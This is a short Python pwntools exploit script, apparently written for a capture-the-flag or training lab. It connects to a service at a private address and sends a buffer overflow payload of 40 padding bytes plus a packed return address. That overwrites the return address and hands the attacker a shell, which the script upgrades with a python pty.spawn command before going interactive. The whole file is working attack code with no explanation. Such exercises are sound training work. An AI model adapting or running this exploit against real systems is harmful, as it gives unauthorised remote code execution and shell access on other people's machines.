#!/usr/bin/env python3
from pwn import *

#context.log_level= 'DEBUG'
ip = '10.10.147.173'
Port= 5700

io = remote(ip, Port) 

io.recvuntil(b"What's your name: ")

vuln_address = p64(0x400686)
payload = b"A" * 40 + vuln_address
io.sendline(payload)
io.recvuntil(b'$')
io.sendline(b'python3 -c \'import pty; pty.spawn("/bin/bash")\'')
io.interactive()
